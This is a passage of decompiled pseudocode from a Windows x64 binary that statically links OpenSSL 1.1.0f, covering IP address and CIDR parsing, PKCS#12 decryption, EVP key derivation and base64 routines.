    if ( sub_1400B9430(a1, "%d.%d.%d.%d", &v6, &v7, &v8, &v9) != 4 || v6 > 0xFF || v7 > 0xFF || v8 > 0xFF || v9 > 0xFF )
      return 0i64;
    LOBYTE(v10) = v6;
    v2 = 4;
    BYTE1(v10) = v7;
    BYTE2(v10) = v8;
    BYTE3(v10) = v9;
  }
  v3 = sub_14004FEE0();
  v4 = (__int64)v3;
  if ( !v3 )
    return 0i64;
  if ( !(unsigned int)sub_14006B0A0((__int64)v3, &v10, v2) )
  {
    sub_14004FD70(v4);
    return 0i64;
  }
  return v4;
}

//----- (00000001400B8BC0) ----------------------------------------------------
char *__fastcall sub_1400B8BC0(char *a1)
{
  __int64 v1; // rbx
  char *result; // rax
  char *v4; // rsi
  const char *v5; // rax
  char *v6; // rdi
  char *v7; // rsi
  unsigned int v8; // ebp
  int v9; // esi
  _DWORD *v10; // rax
  unsigned int v11; // [rsp+30h] [rbp-48h] BYREF
  unsigned int v12; // [rsp+34h] [rbp-44h] BYREF
  unsigned int v13; // [rsp+38h] [rbp-40h] BYREF
  unsigned int v14; // [rsp+3Ch] [rbp-3Ch] BYREF
  _OWORD v15[2]; // [rsp+40h] [rbp-38h] BYREF

  v1 = 0i64;
  result = strchr(a1, 47);
  v4 = result;
  if ( result )
  {
    v5 = (const char *)sub_14003BB60(a1);
    v6 = (char *)v5;
    if ( !v5 )
      return 0i64;
    v7 = &v4[v5 - a1];
    *v7 = 0;
    if ( strchr(v5, 58) )
    {
      if ( (unsigned int)sub_1400B9040(v15, v6) )
      {
        v8 = 16;
LABEL_12:
        v9 = sub_1400B8D90((_OWORD *)((char *)v15 + v8), v7 + 1);
        sub_14001D930(v6);
        v6 = 0i64;
        if ( v9 )
        {
          if ( v8 == v9 )
          {
            v10 = sub_14004FEE0();
            v1 = (__int64)v10;
            if ( v10 )
            {
              if ( (unsigned int)sub_14006B0A0((__int64)v10, v15, v9 + v8) )
                return (char *)v1;
            }
          }
        }
      }
    }
    else if ( sub_1400B9430(v6, "%d.%d.%d.%d", &v11, &v12, &v13, &v14) == 4
           && v11 <= 0xFF
           && v12 <= 0xFF
           && v13 <= 0xFF
           && v14 <= 0xFF )
    {
      LOBYTE(v15[0]) = v11;
      v8 = 4;
      BYTE1(v15[0]) = v12;
      BYTE2(v15[0]) = v13;
      BYTE3(v15[0]) = v14;
      goto LABEL_12;
    }
    sub_14001D930(v6);
    sub_14004FD70(v1);
    return 0i64;
  }
  return result;
}

//----- (00000001400B8D90) ----------------------------------------------------
__int64 __fastcall sub_1400B8D90(_OWORD *a1, const char *a2)
{
  int v2; // eax

  if ( strchr(a2, v2 + 26) )
    return (unsigned int)sub_1400B9040(a1, a2) != 0 ? 0x10 : 0;
  else
    return (unsigned int)sub_1400B8EF0(a1, a2) != 0 ? 4 : 0;
}
// 1400B8DAC: variable 'v2' is possibly undefined

//----- (00000001400B8DF0) ----------------------------------------------------
_WORD *__fastcall sub_1400B8DF0(__int64 a1, __int64 a2)
{
  _WORD *v2; // rbx
  _WORD *result; // rax
  __int64 v4; // rax
  _DWORD *v5; // rdi

  v2 = 0i64;
  result = (_WORD *)a2;
  if ( a2 )
  {
    v4 = sub_14007D930(a2, 0i64);
    v5 = (_DWORD *)v4;
    if ( !v4 || (v2 = sub_140022CC0(v4)) == 0i64 )
      sub_140024610(34, 121, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_utl.c", 106);
    sub_140026FF0(v5);
    return v2;
  }
  return result;
}

//----- (00000001400B8E70) ----------------------------------------------------
_WORD *__fastcall sub_1400B8E70(__int64 a1, __int64 a2)
{
  _WORD *v2; // rbx
  _WORD *result; // rax
  __int64 v4; // rax
  _DWORD *v5; // rdi

  v2 = 0i64;
  result = (_WORD *)a2;
  if ( a2 )
  {
    v4 = sub_14007DA80(a2, 0i64);
    v5 = (_DWORD *)v4;
    if ( !v4 || (v2 = sub_140022CC0(v4)) == 0i64 )
      sub_140024610(34, 120, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_utl.c", 120);
    sub_140026FF0(v5);
    return v2;
  }
  return result;
}

//----- (00000001400B8EF0) ----------------------------------------------------
__int64 __fastcall sub_1400B8EF0(_BYTE *a1, const char *a2)
{
  char v3; // cl
  char v4; // dl
  char v5; // r8
  __int64 result; // rax
  unsigned int v7; // [rsp+30h] [rbp-18h] BYREF
  unsigned int v8[5]; // [rsp+34h] [rbp-14h] BYREF
  unsigned int v9; // [rsp+60h] [rbp+18h] BYREF
  unsigned int v10; // [rsp+68h] [rbp+20h] BYREF

  if ( sub_1400B9430(a2, "%d.%d.%d.%d", &v9, &v10, &v7, v8) != 4 )
    return 0i64;
  if ( v9 > 0xFF )
    return 0i64;
  v3 = v10;
  if ( v10 > 0xFF )
    return 0i64;
  v4 = v7;
  if ( v7 > 0xFF )
    return 0i64;
  v5 = v8[0];
  if ( v8[0] > 0xFF )
    return 0i64;
  *a1 = v9;
  result = 1i64;
  a1[1] = v3;
  a1[2] = v4;
  a1[3] = v5;
  return result;
}
// 1400B8EF0: using guessed type unsigned int var_14[5];

//----- (00000001400B8F90) ----------------------------------------------------
__int64 __fastcall sub_1400B8F90(char *a1, int a2, int *a3)
{
  __int64 v4; // r8
  __int64 result; // rax
  int v6; // eax

  v4 = a3[4];
  if ( (_DWORD)v4 == 16 )
    return 0i64;
  if ( !a2 )
  {
    v6 = a3[5];
    if ( v6 == -1 )
    {
      ++a3[6];
      result = 1i64;
      a3[5] = v4;
      return result;
    }
    if ( v6 == (_DWORD)v4 )
    {
      ++a3[6];
      return 1i64;
    }
    return 0i64;
  }
  if ( a2 <= 4 )
  {
    if ( !(unsigned int)sub_1400B91B0((_BYTE *)a3 + v4, a1, a2) )
      return 0i64;
    a3[4] += 2;
    return 1i64;
  }
  else
  {
    if ( (int)v4 > 12 || a1[a2] || !(unsigned int)sub_1400B8EF0((_BYTE *)a3 + v4, a1) )
      return 0i64;
    a3[4] += 4;
    return 1i64;
  }
}

//----- (00000001400B9040) ----------------------------------------------------
__int64 __fastcall sub_1400B9040(_OWORD *a1, const char *a2)
{
  __int64 result; // rax
  int v4; // edi
  bool v5; // sf
  __int64 v6; // rbx
  __int128 Src; // [rsp+30h] [rbp-38h] BYREF
  int v8; // [rsp+40h] [rbp-28h]
  int v9; // [rsp+44h] [rbp-24h]
  int v10; // [rsp+48h] [rbp-20h]

  v9 = -1;
  v8 = 0;
  v10 = 0;
  result = sub_14002EEA0(
             a2,
             58,
             0,
             (__int64 (__fastcall *)(const char *, __int64, __int64))sub_1400B8F90,
             (__int64)&Src);
  if ( (_DWORD)result )
  {
    if ( v9 == -1 )
    {
      if ( v8 != 16 )
        return 0i64;
      goto LABEL_21;
    }
    v4 = v8;
    if ( v8 == 16 || v10 > 3 )
      return 0i64;
    if ( v10 == 3 )
    {
      if ( v8 > 0 )
        return 0i64;
    }
    else if ( v10 == 2 )
    {
      v5 = v9 < 0;
      if ( !v9 )
        goto LABEL_18;
      if ( v9 != v8 )
        return 0i64;
    }
    else if ( !v9 || v9 == v8 )
    {
      return 0i64;
    }
    v5 = v9 < 0;
LABEL_18:
    if ( !v5 )
    {
      v6 = v9;
      memmove(a1, &Src, v9);
      memset((char *)a1 + v6, 0, 16 - v4);
      if ( v8 != v9 )
      {
        memmove((char *)a1 + v9 - (__int64)v8 + 16, (char *)&Src + v9, v8 - v9);
        return 1i64;
      }
      return 1i64;
    }
LABEL_21:
    *a1 = Src;
    return 1i64;
  }
  return result;
}

//----- (00000001400B91B0) ----------------------------------------------------
__int64 __fastcall sub_1400B91B0(_BYTE *a1, char *a2, int a3)
{
  __int16 v3; // bx
  int v4; // edi
  char v8; // cl
  int v9; // eax

  v3 = 0;
  v4 = a3;
  if ( a3 > 4 )
    return 0i64;
  if ( a3 )
  {
    do
    {
      v8 = *a2++;
      --v4;
      v9 = sub_14003BD50(v8);
      if ( v9 < 0 )
        return 0i64;
      v3 = (char)v9 | (unsigned __int16)(16 * v3);
    }
    while ( v4 );
  }
  a1[1] = v3;
  *a1 = HIBYTE(v3);
  return 1i64;
}

//----- (00000001400B9240) ----------------------------------------------------
int __fastcall sub_1400B9240(const char *a1, const char *a2)
{
  unsigned int v2; // eax
  const char *i; // r8
  __int64 v5; // rbx
  int result; // eax
  char v7; // al

  v2 = 0;
  for ( i = a2; *i; ++v2 )
  {
    if ( v2 >= 0x80000000 )
      break;
    ++i;
  }
  v5 = v2;
  LODWORD(v5) = v2 & 0x7FFFFFFF;
  result = strncmp(a1, a2, v2 & 0x7FFFFFFF);
  if ( !result )
  {
    v7 = a1[v5];
    return v7 && v7 != 46;
  }
  return result;
}

//----- (00000001400B92B0) ----------------------------------------------------
_DWORD *__fastcall sub_1400B92B0(__int64 a1, char *a2)
{
  int v2; // eax
  char *v3; // rbx
  int v5; // edi
  int v6; // eax
  _DWORD *v7; // rbx
  _DWORD *v8; // [rsp+48h] [rbp+10h] BYREF

  v3 = a2;
  v8 = 0i64;
  if ( !a2 )
  {
    sub_140024610(v2 - 14, v2 + 60, v2 + 61, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_utl.c", 132);
    return 0i64;
  }
  v8 = sub_140027200();
  if ( !v8 )
  {
    sub_140024610(34, 108, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_utl.c", 137);
    return 0i64;
  }
  if ( *v3 == 45 )
  {
    ++v3;
    v5 = 1;
  }
  else
  {
    v5 = 0;
  }
  if ( *v3 != 48 || ((v3[1] - 88) & 0xDF) != 0 )
  {
    v6 = sub_140022F40((__int64 *)&v8, v3);
  }
  else
  {
    v3 += 2;
    v6 = sub_140023120((__int64 *)&v8, v3);
  }
  if ( !v6 || v3[v6] )
  {
    sub_140026FF0(v8);
    sub_140024610(34, 108, 100, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_utl.c", 159);
    return 0i64;
  }
  if ( v5 && sub_140027160((__int64)v8) )
    v5 = 0;
  v7 = sub_14007DAA0((__int64)v8, 0i64);
  sub_140026FF0(v8);
  if ( !v7 )
  {
    sub_140024610(34, 108, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_utl.c", 170);
    return 0i64;
  }
  if ( v5 )
    v7[1] |= 0x100u;
  return v7;
}
// 1400B92E4: variable 'v2' is possibly undefined

//----- (00000001400B9430) ----------------------------------------------------
int sub_1400B9430(const char *a1, const char *a2, ...)
{
  unsigned __int64 *v4; // rax
  va_list va; // [rsp+60h] [rbp+18h] BYREF

  va_start(va, a2);
  v4 = (unsigned __int64 *)sub_140003C34();
  return _stdio_common_vsscanf(*v4, a1, 0xFFFFFFFFFFFFFFFFui64, a2, 0i64, va);
}

//----- (00000001400B9490) ----------------------------------------------------
unsigned __int8 *__fastcall sub_1400B9490(unsigned __int8 *a1)
{
  unsigned __int8 *v1; // rbx
  unsigned __int8 *v3; // rcx
  __int64 v4; // rax
  unsigned __int8 *v5; // rdi

  v1 = a1;
  if ( *a1 )
  {
    while ( isspace(*v1) )
    {
      if ( !*++v1 )
        return 0i64;
    }
  }
  if ( !*v1 )
    return 0i64;
  v3 = v1;
  v4 = 0i64;
  do
  {
    if ( (unsigned int)v4 >= 0x80000000 )
      break;
    ++v3;
    v4 = (unsigned int)(v4 + 1);
  }
  while ( *v3 );
  LODWORD(v4) = v4 & 0x7FFFFFFF;
  v5 = &v1[v4 - 1];
  if ( v5 != v1 )
  {
    while ( isspace(*v5) )
    {
      if ( --v5 == v1 )
        goto LABEL_16;
    }
    if ( v1 != v5 )
      v5[1] = 0;
  }
LABEL_16:
  if ( !*v1 )
    return 0i64;
  return v1;
}

//----- (00000001400B9540) ----------------------------------------------------
__int64 __fastcall sub_1400B9540(__int64 *a1, __int64 a2, _BYTE *a3, unsigned int a4, char *a5, int a6)
{
  char *v8; // rbx
  __int64 v9; // rdi
  unsigned int v10; // [rsp+40h] [rbp-18h] BYREF
  char *v11; // [rsp+48h] [rbp-10h] BYREF

  if ( sub_1400B9650(a1, a3, a4, *((char **)a5 + 1), *(_DWORD *)a5, &v11, &v10, 0) )
  {
    v8 = v11;
    a5 = v11;
    v9 = sub_1400516D0(0i64, &a5, v10, a2);
    if ( a6 )
      sub_140023440((__int64)v8, (int)v10);
    if ( !v9 )
      sub_140024610(35, 106, 101, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pkcs12\\p12_decr.c", 114);
    sub_14001D930(v8);
    return v9;
  }
  else
  {
    sub_140024610(35, 106, 117, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pkcs12\\p12_decr.c", 94);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400B9650) ----------------------------------------------------
char *__fastcall sub_1400B9650(
        __int64 *a1,
        _BYTE *a2,
        unsigned int a3,
        char *a4,
        int a5,
        char **a6,
        _DWORD *a7,
        int a8)
{
  char *v12; // rbx
  unsigned int *v13; // rdi
  int v14; // eax
  char *v15; // rax
  int v16; // esi
  int v18; // [rsp+20h] [rbp-38h]
  int v19[10]; // [rsp+30h] [rbp-28h] BYREF

  v12 = 0i64;
  v13 = (unsigned int *)sub_14001B520();
  if ( !v13 )
  {
    v18 = 33;
LABEL_3:
    sub_140024610(35, 119, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pkcs12\\p12_decr.c", v18);
    goto LABEL_17;
  }
  if ( (unsigned int)sub_140035FD0(*a1, a2, a3, a1[1], (__int64)v13, a8) )
  {
    v14 = sub_140024CD0((__int64)v13);
    v15 = (char *)sub_14001D8E0(a5 + v14);
    v12 = v15;
    if ( !v15 )
    {
      v18 = 47;
      goto LABEL_3;
    }
    if ( (unsigned int)sub_14001BAD0((int *)v13, v15, v19, a4, a5) )
    {
      v16 = v19[0];
      if ( (unsigned int)sub_14001B770(v13, (__int64)&v12[v19[0]], v19) )
      {
        if ( a7 )
          *a7 = v16 + v19[0];
        if ( a6 )
          *a6 = v12;
      }
      else
      {
        sub_14001D930(v12);
        v12 = 0i64;
        sub_140024610(35, 119, 116, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pkcs12\\p12_decr.c", 63);
      }
    }
    else
    {
      sub_14001D930(v12);
      v12 = 0i64;
      sub_140024610(35, 119, 6, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pkcs12\\p12_decr.c", 54);
    }
  }
  else
  {
    sub_140024610(35, 119, 115, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pkcs12\\p12_decr.c", 41);
  }
LABEL_17:
  sub_14001B4E0(v13);
  return v12;
}
// 14001B4E0: using guessed type __int64 __fastcall sub_14001B4E0(_QWORD);
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400B9810) ----------------------------------------------------
__int64 __fastcall sub_1400B9810(
        __int64 a1,
        int *a2,
        __int64 a3,
        __int64 a4,
        int a5,
        unsigned int a6,
        _BYTE *a7,
        _BYTE *a8)
{
  int v10; // ebx
  int v14; // esi
  int v15; // ebp
  __int64 *v17; // rax
  __int64 *v18; // rdi
  int v19; // ebx
  int v20; // r8d
  __int64 i; // rax
  int v22; // [rsp+20h] [rbp-C8h] BYREF
  unsigned int v23; // [rsp+24h] [rbp-C4h]
  int v24; // [rsp+28h] [rbp-C0h]
  __int64 v25; // [rsp+30h] [rbp-B8h]
  __int64 v26; // [rsp+38h] [rbp-B0h]
  __int64 v27; // [rsp+40h] [rbp-A8h]
  char v28[64]; // [rsp+50h] [rbp-98h] BYREF

  v10 = 0;
  v23 = 0;
  v22 = 0;
  v25 = a4;
  v26 = a3;
  v27 = a1;
  v14 = sub_140024EB0(a1);
  v15 = sub_140024EA0(a1);
  if ( v14 > 64 )
    sub_1400234A0(
      "assertion failed: nkey <= EVP_MAX_KEY_LENGTH",
      "..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_key.c",
      86i64);
  if ( v15 > 16 )
    sub_1400234A0("assertion failed: niv <= EVP_MAX_IV_LENGTH", "..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_key.c", 87i64);
  if ( !a4 )
    return (unsigned int)v14;
  v17 = (__int64 *)sub_14006DFD0();
  v18 = v17;
  if ( v17 && (unsigned int)sub_14006DB20((__int64)v17, a2, 0i64) )
  {
    while ( 1 )
    {
      v24 = v10 + 1;
      if ( v10 )
      {
        if ( !(unsigned int)sub_14006DD90((__int64)v18) )
          break;
      }
      if ( !(unsigned int)sub_14006DD90((__int64)v18)
        || v26 && !(unsigned int)sub_14006DD90((__int64)v18)
        || !(unsigned int)sub_14006DA80(v18, (__int64)v28, &v22) )
      {
        break;
      }
      v19 = 1;
      if ( a6 > 1 )
      {
        while ( (unsigned int)sub_14006DB20((__int64)v18, a2, 0i64)
             && (unsigned int)sub_14006DD90((__int64)v18)
             && (unsigned int)sub_14006DA80(v18, (__int64)v28, &v22) )
        {
          if ( ++v19 >= a6 )
            goto LABEL_20;
        }
        break;
      }
LABEL_20:
      v20 = v22;
      for ( i = 0i64; v14; --v14 )
      {
        if ( (_DWORD)i == v20 )
          break;
        if ( a7 )
          *a7++ = v28[i];
        i = (unsigned int)(i + 1);
      }
      if ( v15 && (_DWORD)i != v20 )
      {
        do
        {
          if ( (_DWORD)i == v20 )
            break;
          if ( a8 )
            *a8++ = v28[i];
          i = (unsigned int)(i + 1);
          --v15;
        }
        while ( v15 );
      }
      if ( !v14 && !v15 )
      {
        v23 = sub_140024EB0(v27);
        break;
      }
      if ( !(unsigned int)sub_14006DB20((__int64)v18, a2, 0i64) )
        break;
      v10 = v24;
    }
  }
  sub_14006DF90(v18);
  sub_140023440((__int64)v28, 64i64);
  return v23;
}
// 1400B9810: using guessed type char var_98[64];

//----- (00000001400B9AB0) ----------------------------------------------------
char *sub_1400B9AB0()
{
  if ( byte_1401434A0 )
    return &byte_1401434A0;
  else
    return 0i64;
}
// 1401434A0: using guessed type char byte_1401434A0;

//----- (00000001400B9AD0) ----------------------------------------------------
__int64 __fastcall sub_1400B9AD0(void *a1, int a2, int a3, __int64 a4, int a5)
{
  __int64 v5; // rbx
  char *v9; // rax
  __int64 *v10; // rdi
  unsigned int v12; // ebx
  char v13[512]; // [rsp+40h] [rbp-238h] BYREF

  v5 = a4;
  if ( !a4 )
  {
    v9 = &byte_1401434A0;
    if ( !byte_1401434A0 )
      v9 = 0i64;
    v5 = (__int64)v9;
  }
  v10 = sub_1400C1730();
  if ( !v10 )
    return 0xFFFFFFFFi64;
  if ( a3 >= 512 )
    a3 = 511;
  sub_1400C1550((__int64)v10, v5, 0, (__int64)a1, a2, a3);
  if ( a5 )
    sub_1400C15F0((__int64)v10, v5, 0, (__int64)v13, a2, a3, a1);
  v12 = sub_1400C1850((__int64)v10);
  sub_1400C1690((__int64)v10);
  sub_140023440((__int64)v13, 512i64);
  return v12;
}
// 1401434A0: using guessed type char byte_1401434A0;

//----- (00000001400B9BD0) ----------------------------------------------------
__int64 __fastcall sub_1400B9BD0(_BYTE *a1, char *a2, int a3)
{
  unsigned int v4; // r14d
  __int64 v5; // rcx
  char v6; // al
  char v7; // al
  int v9; // ebp
  unsigned __int8 v10; // r10
  char v11; // al
  unsigned __int8 v12; // cl
  char v13; // al
  unsigned __int8 v14; // al
  int v15; // ebx
  char v16; // al
  unsigned __int8 v17; // r11
  int v18; // r9d

  v4 = 0;
  while ( *a2 >= 0 && byte_1401221B0[(unsigned __int8)*a2] == 0xE0 && a3 > 0 )
  {
    ++a2;
    --a3;
  }
  v5 = a3;
  if ( a3 > 3i64 )
  {
    do
    {
      v6 = a2[v5 - 1];
      if ( v6 >= 0 )
        v7 = byte_1401221B0[(unsigned __int8)v6];
      else
        v7 = -1;
      if ( ((unsigned __int8)v7 | 0x13) != 0xF3 )
        break;
      --a3;
      --v5;
    }
    while ( v5 > 3 );
  }
  if ( a3 % 4 )
    return 0xFFFFFFFFi64;
  v9 = 0;
  if ( a3 <= 0 )
    return v4;
  while ( 1 )
  {
    v10 = *a2 >= 0 ? byte_1401221B0[(unsigned __int8)*a2] : -1;
    v11 = a2[1];
    v12 = v11 >= 0 ? byte_1401221B0[(unsigned __int8)v11] : -1;
    v13 = a2[2];
    v14 = v13 >= 0 ? byte_1401221B0[(unsigned __int8)v13] : -1;
    v15 = v14;
    v16 = a2[3];
    v17 = v16 >= 0 ? byte_1401221B0[(unsigned __int8)v16] : -1;
    a2 += 4;
    if ( ((v10 | v12) & 0x80u) != 0 || ((v15 | v17) & 0x80u) != 0 )
      break;
    v4 += 3;
    v9 += 4;
    v18 = v17 | ((v15 | ((v12 | (v10 << 6)) << 6)) << 6);
    *a1 = BYTE2(v18);
    a1[1] = BYTE1(v18);
    a1[2] = v18;
    a1 += 3;
    if ( v9 >= a3 )
      return v4;
  }
  return 0xFFFFFFFFi64;
}
// 1401221B0: using guessed type _BYTE byte_1401221B0[128];

//----- (00000001400B9D50) ----------------------------------------------------
__int64 __fastcall sub_1400B9D50(__int64 a1, _BYTE *a2, int *a3)
{
  int v5; // eax

  *a3 = 0;
  if ( *(_DWORD *)a1 )
  {
    v5 = sub_1400B9BD0(a2, (char *)(a1 + 8), *(_DWORD *)a1);
    if ( v5 < 0 )
      return 0xFFFFFFFFi64;
    *(_DWORD *)a1 = 0;
    *a3 = v5;
  }
  return 1i64;
}

//----- (00000001400B9DC0) ----------------------------------------------------
__int64 __fastcall sub_1400B9DC0(_QWORD *a1)
{
  __int64 result; // rax

  result = 0i64;
  *a1 = 0i64;
  a1[11] = 0i64;
  return result;
}

//----- (00000001400B9DD0) ----------------------------------------------------
__int64 __fastcall sub_1400B9DD0(int *a1, _BYTE *a2, _DWORD *a3, unsigned __int8 *a4, int a5)
{
  int v5; // r10d
  char *v6; // rbp
  unsigned int v7; // ebx
  int v10; // edx
  int v11; // edi
  int v12; // r15d
  int v13; // esi
  __int64 v14; // r8
  __int64 v15; // rdx
  unsigned __int8 v16; // al
  int v17; // eax
  int v18; // eax
  int v19; // eax
  int v21; // [rsp+20h] [rbp-48h]

  v5 = *a1;
  v6 = (char *)(a1 + 2);
  v7 = 0;
  v21 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  if ( *a1 > 0 && v6[v5 - 1] == 61 )
  {
    v11 = 1;
    if ( v5 > 1 && v6[v5 - 2] == 61 )
      v11 = 2;
  }
  if ( a5 )
  {
    v13 = 0;
    if ( a5 > 0 )
    {
      v14 = *a1;
      while ( 1 )
      {
        v15 = *a4++;
        v16 = (v15 & 0x80u) == 0i64 ? byte_1401221B0[v15] : -1;
        if ( v16 == 255 )
          goto LABEL_40;
        if ( (_DWORD)v15 == 61 )
        {
          ++v11;
        }
        else if ( v11 > 0 && (v16 | 0x13) != 243 )
        {
          goto LABEL_40;
        }
        if ( v11 > 2 )
          goto LABEL_40;
        if ( v16 == 242 )
        {
          v10 = 1;
          v21 = 1;
          break;
        }
        if ( (v16 | 0x13) != 243 )
        {
          if ( v5 >= 64 )
            goto LABEL_40;
          ++v5;
          v6[v14++] = v15;
        }
        if ( v5 == 64 )
        {
          v17 = sub_1400B9BD0(a2, v6, 64);
          v5 = 0;
          v14 = 0i64;
          if ( v17 < 0 || v11 > v17 )
            goto LABEL_40;
          v18 = v17 - v11;
          v12 += v18;
          a2 += v18;
        }
        if ( ++v13 >= a5 )
        {
          v10 = 0;
          break;
        }
      }
    }
    if ( v5 > 0 )
    {
      if ( (v5 & 3) != 0 )
      {
        if ( !v10 )
        {
LABEL_35:
          if ( v5 || !v11 )
            v7 = 1;
          goto LABEL_38;
        }
      }
      else
      {
        v19 = sub_1400B9BD0(a2, v6, v5);
        v5 = 0;
        if ( v19 >= 0 && v11 <= v19 )
        {
          v12 += v19 - v11;
          goto LABEL_34;
        }
      }
LABEL_40:
      v7 = -1;
      goto LABEL_38;
    }
LABEL_34:
    if ( v21 )
      goto LABEL_38;
    goto LABEL_35;
  }
LABEL_38:
  *a3 = v12;
  *a1 = v5;
  return v7;
}
// 1401221B0: using guessed type _BYTE byte_1401221B0[128];

//----- (00000001400B9FA0) ----------------------------------------------------
void __fastcall sub_1400B9FA0(void *a1)
{
  sub_14001D930(a1);
}

//----- (00000001400B9FD0) ----------------------------------------------------
void *__fastcall sub_1400B9FD0()
{
  int v0; // eax

  return sub_14001DC20((unsigned int)(v0 + 56));
}
// 1400B9FE8: variable 'v0' is possibly undefined

//----- (00000001400BA000) ----------------------------------------------------
__int64 __fastcall sub_1400BA000(_BYTE *a1, __int64 a2, int a3)
{
  unsigned int v3; // r10d
  unsigned __int8 *v4; // r9
  unsigned __int64 v5; // rdx
  _BYTE *v6; // rcx
  unsigned __int64 v7; // rdx
  char v8; // al

  v3 = 0;
  if ( a3 <= 0 )
  {
    *a1 = 0;
    return 0i64;
  }
  else
  {
    v4 = (unsigned __int8 *)(a2 + 1);
    do
    {
      if ( a3 < 3 )
      {
        v7 = *(v4 - 1) << 16;
        if ( a3 == 2 )
          v7 = (*v4 << 8) | (unsigned int)v7;
        *a1 = BASE64_table_140122160[v7 >> 18];
        a1[1] = BASE64_table_140122160[(v7 >> 12) & 0x3F];
        if ( a3 == 1 )
          v8 = 61;
        else
          v8 = BASE64_table_140122160[(v7 >> 6) & 0x3F];
        a1[2] = v8;
        v6 = a1 + 3;
        *v6 = 61;
      }
      else
      {
        v5 = v4[1] | ((*v4 | ((unsigned __int64)*(v4 - 1) << 8)) << 8);
        *a1 = BASE64_table_140122160[v5 >> 18];
        a1[1] = BASE64_table_140122160[(v5 >> 12) & 0x3F];
        a1[2] = BASE64_table_140122160[(v5 >> 6) & 0x3F];
        v6 = a1 + 3;
        *v6 = BASE64_table_140122160[v5 & 0x3F];
      }
      v3 += 4;
      v4 += 3;
      a3 -= 3;
      a1 = v6 + 1;
    }
    while ( a3 > 0 );
    *a1 = 0;
    return v3;
  }
}

//----- (00000001400BA100) ----------------------------------------------------
void __fastcall sub_1400BA100(int *a1, _BYTE *a2, unsigned int *a3)
{
  unsigned int v6; // eax
  __int64 v7; // r8

  if ( *a1 )
  {
    v6 = sub_1400BA000(a2, (__int64)(a1 + 2), *a1);
    v7 = v6++;
    a2[v7] = 10;
    a2[v6] = 0;
    *a1 = 0;
    *a3 = v6;
  }
  else
  {
    *a3 = 0;
  }
}

//----- (00000001400BA180) ----------------------------------------------------
__int64 __fastcall sub_1400BA180(_DWORD *a1)
{
  __int64 result; // rax

  result = 0i64;
  a1[1] = 48;
  *a1 = 0;
  a1[22] = 0;
  return result;
}

//----- (00000001400BA190) ----------------------------------------------------
__int64 __fastcall sub_1400BA190(int *a1, _BYTE *a2, _DWORD *a3, char *a4, int a5)
{
  int v5; // esi
  unsigned __int64 v6; // rdi
  char *v7; // rbp
  __int64 v12; // rax
  int v13; // r15d
  int v14; // eax
  _BYTE *v15; // r14
  int v16; // eax
  __int64 v17; // rdx
  _BYTE *v18; // r14

  v5 = a5;
  v6 = 0i64;
  *a3 = 0;
  v7 = a4;
  if ( a5 <= 0 )
    return 0i64;
  if ( a1[1] > 80 )
    sub_1400234A0(
      "assertion failed: ctx->length <= (int)sizeof(ctx->enc_data)",
      "..\\..\\openssl-1.1.0f\\crypto\\evp\\encode.c",
      134i64);
  v12 = *a1;
  v13 = a1[1] - v12;
  if ( v13 <= a5 )
  {
    if ( (_DWORD)v12 )
    {
      memmove((char *)a1 + v12 + 8, a4, v13);
      v7 += v13;
      v5 = a5 - v13;
      v14 = sub_1400BA000(a2, (__int64)(a1 + 2), a1[1]);
      v15 = &a2[v14];
      *a1 = 0;
      *v15 = 10;
      a2 = v15 + 1;
      v6 = v14 + 1;
      *a2 = 0;
    }
    if ( v5 < a1[1] )
    {
LABEL_12:
      if ( v6 <= 0x7FFFFFFF )
      {
        if ( v5 )
          memmove(a1 + 2, v7, v5);
        *a1 = v5;
        *a3 = v6;
        return 1i64;
      }
    }
    else
    {
      while ( v6 <= 0x7FFFFFFF )
      {
        v16 = sub_1400BA000(a2, (__int64)v7, a1[1]);
        v17 = a1[1];
        v7 += v17;
        v18 = &a2[v16];
        v5 -= v17;
        *v18 = 10;
        a2 = v18 + 1;
        v6 += v16 + 1;
        *a2 = 0;
        if ( v5 < a1[1] )
          goto LABEL_12;
      }
    }
    *a3 = 0;
    return 0i64;
  }
  memmove((char *)a1 + v12 + 8, a4, a5);
  *a1 += a5;
  return 1i64;
}

//----- (00000001400BA300) ----------------------------------------------------
int *__fastcall sub_1400BA300(__int64 a1, __int64 a2, unsigned int *a3)
{
  int *v6; // rdi
  int v8; // esi
  __int64 v9; // rbx
  __int64 v10; // rdx
  __int64 v11; // rcx
  char v12; // al
  int v13; // r8d
  __int64 v14; // rdx
  __int64 v15; // rax
  char v16; // cl
  __int64 v17; // rax

  v6 = (int *)sub_1400296C0();
  if ( v6 )
  {
    v8 = 0;
    if ( (int)sub_1400296E0(a3) <= 0 )
    {
      return v6;
    }
    else
    {
      while ( 1 )
      {
        v9 = sub_140029880((__int64)a3, v8);
        if ( !sub_1400B9240(*(const char **)(v9 + 8), "email") )
        {
          v10 = *(_QWORD *)(v9 + 16);
          if ( v10 )
          {
            v11 = 0i64;
            while ( 1 )
            {
              v12 = *(_BYTE *)(v10 + v11++);
              if ( v12 != aCopy[v11 - 1] )
                break;
              if ( v11 == 5 )
              {
                v13 = 0;
LABEL_16:
                if ( (unsigned int)sub_1400BADF0(a2, v6, v13) )
                  goto LABEL_20;
                goto LABEL_17;
              }
            }
          }
        }
        if ( !sub_1400B9240(*(const char **)(v9 + 8), "email") )
        {
          v14 = *(_QWORD *)(v9 + 16);
          if ( v14 )
          {
            v15 = 0i64;
            while ( 1 )
            {
